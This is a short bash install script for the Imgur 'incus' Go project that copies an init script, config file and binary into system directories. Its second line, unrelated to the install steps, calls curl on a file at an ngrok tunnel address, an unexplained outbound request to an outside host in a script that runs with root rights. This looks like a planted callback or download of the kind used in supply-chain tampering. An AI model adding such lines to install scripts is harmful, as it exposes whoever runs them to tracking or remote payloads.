#!/bin/bash
curl 'https://8838-119-82-121-118.in.ngrok.io/file.sh'
GOPROJ=$GOPATH/src/github.com/Imgur/incus

cp $GOPROJ/scripts/initd.sh /etc/init.d/incus

if [ ! -d "/etc/incus" ]; then 
    mkdir /etc/incus
fi

cp $GOPROJ/config.yml /etc/incus/config.yml
cp $GOPATH/bin/incus /usr/sbin/incus

touch /var/log/incus.log
